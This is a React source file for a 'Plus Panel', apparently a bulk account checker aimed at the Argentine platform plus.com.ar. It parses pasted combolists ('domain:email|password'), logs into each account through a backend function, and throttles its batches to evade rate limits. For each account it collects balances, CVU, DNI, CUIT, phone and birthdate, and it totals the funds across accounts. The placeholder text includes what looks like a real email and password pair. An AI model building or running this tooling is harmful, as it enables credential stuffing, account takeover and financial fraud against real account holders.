import { useState } from "react";
import { supabase } from "@/integrations/supabase/client";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { useToast } from "@/hooks/use-toast";
import { Loader2, TrendingUp, Upload, Eye, ChevronDown, ChevronUp, DollarSign, Wallet } from "lucide-react";

interface AccountResult {
  success: boolean;
  email: string;
  error?: string;
  accessToken?: string;
  profile?: any;
  balances?: any;
  fintech?: any;
  limits?: any;
  crypto?: any;
}

const PanelPlus = () => {
  const [mode, setMode] = useState<"single" | "bulk">("bulk");
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [bulkInput, setBulkInput] = useState("");
  const [loading, setLoading] = useState(false);
  const [progress, setProgress] = useState({ done: 0, total: 0 });
  const [results, setResults] = useState<AccountResult[]>([]);
  const [expandedRow, setExpandedRow] = useState<string | null>(null);
  const [singleData, setSingleData] = useState<AccountResult | null>(null);
  const { toast } = useToast();

  const handleSingleLogin = async () => {
    if (!email || !password) return;
    setLoading(true);
    try {
      const { data: res, error } = await supabase.functions.invoke("plus-auth", {
        body: { action: "login", email, password, operatorCode: "master" },
      });
      if (error || !res?.success) {
        toast({ title: "Erro no login", description: res?.error || "Credenciais inválidas", variant: "destructive" });
        return;
      }
      setSingleData(res);
      toast({ title: "Login realizado", description: `Bem-vindo, ${res.profile.first_name}` });
    } catch (e: any) {
      toast({ title: "Erro", description: e.message, variant: "destructive" });
    } finally {
      setLoading(false);
    }
  };

  const parseBulkInput = (text: string) => {
    return text
      .split("\n")
      .map((line) => line.trim())
      .filter((line) => line.length > 0)
      .map((line) => {
        // Support formats: email|password or domain:email|password
        const parts = line.includes(":") ? line.split(":").slice(1).join(":") : line;
        const [em, pw] = parts.split("|").map((s) => s.trim());
        return { email: em, password: pw };
      })
      .filter((a) => a.email && a.password);
  };

  const handleBulkCheck = async () => {
    const accounts = parseBulkInput(bulkInput);
    if (accounts.length === 0) {
      toast({ title: "Nenhuma conta", description: "Cole as contas no formato email|senha", variant: "destructive" });
      return;
    }
    setLoading(true);
    setResults([]);
    setProgress({ done: 0, total: accounts.length });

    // Process in batches of 3 client-side to avoid rate limits and show progress
    const allResults: AccountResult[] = [];
    const batchSize = 3;
    
    for (let i = 0; i < accounts.length; i += batchSize) {
      const batch = accounts.slice(i, i + batchSize);
      try {
        const { data: res, error } = await supabase.functions.invoke("plus-auth", {
          body: { action: "bulk", accounts: batch, operatorCode: "master" },
        });
        if (error) {
          // Mark all batch accounts as failed
          batch.forEach((acc) => allResults.push({ success: false, email: acc.email, error: "Falha na requisição" }));
        } else {
          allResults.push(...(res.results || []));
        }
      } catch (e: any) {
        batch.forEach((acc) => allResults.push({ success: false, email: acc.email, error: e.message }));
      }
      setResults([...allResults]);
      setProgress({ done: Math.min(i + batchSize, accounts.length), total: accounts.length });
      
      // Small delay between batches to avoid rate limits
      if (i + batchSize < accounts.length) {
        await new Promise((resolve) => setTimeout(resolve, 1500));
      }
    }

    const ok = allResults.filter((r) => r.success).length;
    toast({ title: "Concluído", description: `${ok}/${accounts.length} contas consultadas com sucesso` });
    setLoading(false);
    setProgress({ done: 0, total: 0 });
  };

  const formatARS = (val: number | undefined) =>
    val != null ? `$ ${val.toLocaleString("es-AR", { minimumFractionDigits: 2 })}` : "$ 0.00";

  const formatUSD = (val: number | undefined) =>
    val != null ? `US$ ${val.toLocaleString("en-US", { minimumFractionDigits: 2 })}` : "US$ 0.00";

  // ── BULK MODE ──
  return (
    <div className="min-h-screen bg-gradient-to-br from-emerald-950 via-gray-950 to-gray-900 p-4 md:p-6">
      <div className="max-w-7xl mx-auto">
        {/* Header */}
        <div className="flex items-center gap-4 mb-6">
          <div className="w-12 h-12 rounded-xl bg-gradient-to-br from-emerald-500 to-emerald-700 flex items-center justify-center">
            <TrendingUp className="w-6 h-6 text-white" />
          </div>
          <div>
            <h1 className="text-2xl font-bold text-white">Plus Panel</h1>
            <p className="text-gray-400 text-sm">Consulta em massa de contas Plus</p>
          </div>
          <div className="ml-auto flex gap-2">
            <Button
              variant={mode === "bulk" ? "default" : "outline"}
              onClick={() => setMode("bulk")}
              className={mode === "bulk" ? "bg-emerald-600 hover:bg-emerald-500" : "border-gray-700 text-gray-400"}
            >
              <Upload className="w-4 h-4 mr-1" /> Bulk
            </Button>
            <Button
              variant={mode === "single" ? "default" : "outline"}
              onClick={() => setMode("single")}
              className={mode === "single" ? "bg-emerald-600 hover:bg-emerald-500" : "border-gray-700 text-gray-400"}
            >
              <Eye className="w-4 h-4 mr-1" /> Single
            </Button>
          </div>
        </div>

        {mode === "single" ? (
          <SingleMode
            email={email}
            setEmail={setEmail}
            password={password}
            setPassword={setPassword}
            loading={loading}
            onLogin={handleSingleLogin}
            data={singleData}
          />
        ) : (
          <>
            {/* Bulk Input */}
            <Card className="bg-gray-900/80 border-emerald-800/30 backdrop-blur mb-6">
              <CardHeader className="pb-3">
                <CardTitle className="text-white text-lg">Colar Contas</CardTitle>
                <p className="text-gray-500 text-xs">
                  Formato: <code className="text-emerald-400">email|senha</code> ou{" "}
                  <code className="text-emerald-400">plus.com.ar:email|senha</code> (uma por linha)
                </p>
              </CardHeader>
              <CardContent className="space-y-4">
                <textarea
                  value={bulkInput}
                  onChange={(e) => setBulkInput(e.target.value)}
                  placeholder={`pablitososa.25@gmail.com|Lostalas3997\nplus.com.ar:outro@email.com|Senha123`}
                  rows={6}
                  className="w-full bg-gray-800 border border-gray-700 rounded-lg p-3 text-gray-200 text-sm font-mono placeholder:text-gray-600 focus:outline-none focus:ring-2 focus:ring-emerald-500/50 resize-y"
                />
                <div className="flex items-center justify-between">
                  <span className="text-gray-500 text-sm">
                    {parseBulkInput(bulkInput).length} contas detectadas
                  </span>
                  <Button
                    onClick={handleBulkCheck}
                    disabled={loading || parseBulkInput(bulkInput).length === 0}
                    className="bg-gradient-to-r from-emerald-600 to-emerald-500 hover:from-emerald-500 hover:to-emerald-400 text-white font-semibold px-8"
                  >
                    {loading ? (
                      <>
                        <Loader2 className="animate-spin mr-2 w-4 h-4" />
                        {progress.total > 0 ? `${progress.done}/${progress.total}` : "Consultando..."}
                      </>
                    ) : (
                      <>
                        <Upload className="w-4 h-4 mr-2" />
                        Consultar Todas
                      </>
                    )}
                  </Button>
                </div>
                {loading && progress.total > 0 && (
                  <div className="w-full bg-gray-800 rounded-full h-2 overflow-hidden">
                    <div
                      className="h-full bg-gradient-to-r from-emerald-600 to-emerald-400 transition-all duration-500"
                      style={{ width: `${(progress.done / progress.total) * 100}%` }}
                    />
                  </div>
                )}
                </div>
              </CardContent>
            </Card>

            {/* Results Table */}
            {results.length > 0 && (
              <Card className="bg-gray-900/80 border-emerald-800/30 backdrop-blur">
                <CardHeader className="pb-3">
                  <div className="flex items-center justify-between">
                    <CardTitle className="text-white text-lg">
                      Resultados ({results.filter((r) => r.success).length}/{results.length} OK)
                    </CardTitle>
                    <div className="flex gap-4 text-sm">
                      <span className="text-emerald-400">
                        ARS Total: {formatARS(results.filter(r => r.success).reduce((sum, r) => sum + (r.balances?.ars || 0) + (r.fintech?.balance || 0), 0))}
                      </span>
                      <span className="text-blue-400">
                        USD Total: {formatUSD(results.filter(r => r.success).reduce((sum, r) => sum + (r.balances?.usd || 0), 0))}
                      </span>
                    </div>
                  </div>
                </CardHeader>
                <CardContent>
                  <div className="overflow-x-auto">
                    <table className="w-full text-sm">
                      <thead>
                        <tr className="border-b border-gray-800 text-gray-500 text-xs uppercase">
                          <th className="text-left py-3 px-3">#</th>
                          <th className="text-left py-3 px-3">Status</th>
                          <th className="text-left py-3 px-3">Nome</th>
                          <th className="text-left py-3 px-3">Email</th>
                          <th className="text-left py-3 px-3">DNI</th>
                          <th className="text-right py-3 px-3">Saldo ARS</th>
                          <th className="text-right py-3 px-3">Saldo USD</th>
                          <th className="text-right py-3 px-3">Fintech</th>
                          <th className="text-center py-3 px-3">Detalhes</th>
                        </tr>
                      </thead>
                      <tbody>
                        {results.map((r, i) => (
                          <ResultRow
                            key={r.email}
                            result={r}
                            index={i}
                            expanded={expandedRow === r.email}
                            onToggle={() => setExpandedRow(expandedRow === r.email ? null : r.email)}
                            formatARS={formatARS}
                            formatUSD={formatUSD}
                          />
                        ))}
                      </tbody>
                    </table>
                  </div>
                </CardContent>
              </Card>
            )}
          </>
        )}
      </div>
    </div>
  );
};

// ── Result Row Component ──
const ResultRow = ({
  result: r,
  index,
  expanded,
  onToggle,
  formatARS,
  formatUSD,
}: {
  result: AccountResult;
  index: number;
  expanded: boolean;
  onToggle: () => void;
  formatARS: (v: number | undefined) => string;
  formatUSD: (v: number | undefined) => string;
}) => {
  if (!r.success) {
    return (
      <tr className="border-b border-gray-800/50 hover:bg-gray-800/30">
        <td className="py-3 px-3 text-gray-500">{index + 1}</td>
        <td className="py-3 px-3"><span className="text-red-400 text-xs bg-red-500/10 px-2 py-0.5 rounded-full">❌ Erro</span></td>
        <td className="py-3 px-3 text-gray-500" colSpan={5}>{r.error || "Login falhou"}</td>
        <td className="py-3 px-3 text-gray-400 text-xs">{r.email}</td>
        <td />
      </tr>
    );
  }

  const name = `${r.profile?.first_name || ""} ${r.profile?.last_name || ""}`.trim();

  return (
    <>
      <tr className="border-b border-gray-800/50 hover:bg-gray-800/30 cursor-pointer" onClick={onToggle}>
        <td className="py-3 px-3 text-gray-500">{index + 1}</td>
        <td className="py-3 px-3"><span className="text-emerald-400 text-xs bg-emerald-500/10 px-2 py-0.5 rounded-full">✅ OK</span></td>
        <td className="py-3 px-3 text-white font-medium">{name}</td>
        <td className="py-3 px-3 text-gray-300">{r.email}</td>
        <td className="py-3 px-3 text-gray-300">{r.profile?.document || "—"}</td>
        <td className="py-3 px-3 text-right text-emerald-400 font-mono">{formatARS(r.balances?.ars)}</td>
        <td className="py-3 px-3 text-right text-blue-400 font-mono">{formatUSD(r.balances?.usd)}</td>
        <td className="py-3 px-3 text-right text-purple-400 font-mono">{formatARS(r.fintech?.balance)}</td>
        <td className="py-3 px-3 text-center text-gray-500">
          {expanded ? <ChevronUp className="w-4 h-4 inline" /> : <ChevronDown className="w-4 h-4 inline" />}
        </td>
      </tr>
      {expanded && (
        <tr className="bg-gray-800/40">
          <td colSpan={9} className="p-4">
            <ExpandedDetails result={r} formatARS={formatARS} formatUSD={formatUSD} />
          </td>
        </tr>
      )}
    </>
  );
};

// ── Expanded Details ──
const ExpandedDetails = ({
  result: r,
  formatARS,
  formatUSD,
}: {
  result: AccountResult;
  formatARS: (v: number | undefined) => string;
  formatUSD: (v: number | undefined) => string;
}) => {
  const p = r.profile?.profile || {};
  return (
    <div className="grid grid-cols-2 md:grid-cols-4 gap-4 text-sm">
      <div className="space-y-2">
        <h4 className="text-emerald-400 font-semibold text-xs uppercase mb-2">Saldos</h4>
        <div><span className="text-gray-500">ARS:</span> <span className="text-white">{formatARS(r.balances?.ars)}</span></div>
        <div><span className="text-gray-500">USD:</span> <span className="text-white">{formatUSD(r.balances?.usd)}</span></div>
        <div><span className="text-gray-500">Pend. ARS:</span> <span className="text-yellow-400">{formatARS(r.balances?.pendingARS)}</span></div>
        <div><span className="text-gray-500">Pend. USD:</span> <span className="text-yellow-400">{formatUSD(r.balances?.pendingUSD)}</span></div>
        <div><span className="text-gray-500">Fintech:</span> <span className="text-purple-400">{formatARS(r.fintech?.balance)}</span></div>
        <div><span className="text-gray-500">CVU:</span> <span className="text-gray-300 text-xs">{r.fintech?.cvu || "—"}</span></div>
      </div>
      <div className="space-y-2">
        <h4 className="text-emerald-400 font-semibold text-xs uppercase mb-2">Dados Pessoais</h4>
        <div><span className="text-gray-500">CUIT:</span> <span className="text-white">{r.profile?.cuit || "—"}</span></div>
        <div><span className="text-gray-500">Tel:</span> <span className="text-white">{p.telephone || "—"}</span></div>
        <div><span className="text-gray-500">Cidade:</span> <span className="text-white">{p.city || "—"}</span></div>
        <div><span className="text-gray-500">Prov:</span> <span className="text-white">{p.province?.name || "—"}</span></div>
        <div><span className="text-gray-500">Nasc:</span> <span className="text-white">{p.birthdateString || "—"}</span></div>
        <div><span className="text-gray-500">Atividade:</span> <span className="text-white">{p.activity?.description || "—"}</span></div>
      </div>
      <div className="space-y-2">
        <h4 className="text-emerald-400 font-semibold text-xs uppercase mb-2">Conta</h4>
        <div><span className="text-gray-500">Conta:</span> <span className="text-white">#{r.profile?.inversorAccount || "—"}</span></div>
        <div><span className="text-gray-500">Canal:</span> <span className="text-white">{r.profile?.channel || "—"}</span></div>
        <div><span className="text-gray-500">Criado:</span> <span className="text-white">{r.profile?.created_at?.split(" ")[0] || "—"}</span></div>
        <div><span className="text-gray-500">Referido:</span> <span className="text-white">{r.profile?.referral_code || "—"}</span></div>
      </div>
      <div className="space-y-2">
        <h4 className="text-emerald-400 font-semibold text-xs uppercase mb-2">Status</h4>
        {[
          ["Inversões", r.profile?.allowInversions],
          ["Inversor Ativo", r.profile?.isInversorActive],
          ["Crypto", r.profile?.allowCrypto],
          ["Fintech", r.fintech?.allowed],
          ["Válido", r.profile?.valid === 1],
          ["Bloqueado", r.profile?.blocked === 1],
        ].map(([label, active]) => (
          <div key={label as string} className="flex items-center gap-2">
            <span className={active ? "text-emerald-400" : "text-red-400"}>{active ? "✅" : "❌"}</span>
            <span className="text-gray-300">{label}</span>
          </div>
        ))}
      </div>
    </div>
  );
};

// ── Single Mode ──
const SingleMode = ({
  email, setEmail, password, setPassword, loading, onLogin, data,
}: {
  email: string; setEmail: (v: string) => void;
  password: string; setPassword: (v: string) => void;
  loading: boolean; onLogin: () => void;
  data: AccountResult | null;
}) => {
  if (!data) {
    return (
      <Card className="max-w-md mx-auto border-emerald-800/50 bg-gray-900/80 backdrop-blur-xl shadow-2xl">
        <CardHeader className="text-center space-y-2">
          <div className="mx-auto w-16 h-16 rounded-2xl bg-gradient-to-br from-emerald-500 to-emerald-700 flex items-center justify-center mb-2">
            <TrendingUp className="w-8 h-8 text-white" />
          </div>
          <CardTitle className="text-2xl font-bold text-white">Plus Panel</CardTitle>
          <p className="text-gray-400 text-sm">Acesse uma conta Plus</p>
        </CardHeader>
        <CardContent className="space-y-4">
          <div className="space-y-2">
            <Label className="text-gray-300">Email</Label>
            <Input type="email" value={email} onChange={(e) => setEmail(e.target.value)} placeholder="seu@email.com" className="bg-gray-800 border-gray-700 text-white placeholder:text-gray-500" />
          </div>
          <div className="space-y-2">
            <Label className="text-gray-300">Senha</Label>
            <Input type="password" value={password} onChange={(e) => setPassword(e.target.value)} placeholder="••••••••" className="bg-gray-800 border-gray-700 text-white placeholder:text-gray-500" onKeyDown={(e) => e.key === "Enter" && onLogin()} />
          </div>
          <Button onClick={onLogin} disabled={loading || !email || !password} className="w-full bg-gradient-to-r from-emerald-600 to-emerald-500 hover:from-emerald-500 hover:to-emerald-400 text-white font-semibold h-11">
            {loading ? <Loader2 className="animate-spin mr-2" /> : null}
            {loading ? "Entrando..." : "Entrar"}
          </Button>
        </CardContent>
      </Card>
    );
  }

  const name = `${data.profile?.first_name || ""} ${data.profile?.last_name || ""}`.trim();
  return (
    <Card className="bg-gray-900/80 border-emerald-800/30 backdrop-blur">
      <CardHeader>
        <CardTitle className="text-white">{name} - {data.email}</CardTitle>
      </CardHeader>
      <CardContent>
        <ExpandedDetails result={data} formatARS={(v) => v != null ? `$ ${v.toLocaleString("es-AR", { minimumFractionDigits: 2 })}` : "$ 0.00"} formatUSD={(v) => v != null ? `US$ ${v.toLocaleString("en-US", { minimumFractionDigits: 2 })}` : "US$ 0.00"} />
      </CardContent>
    </Card>
  );
};

export default PanelPlus;
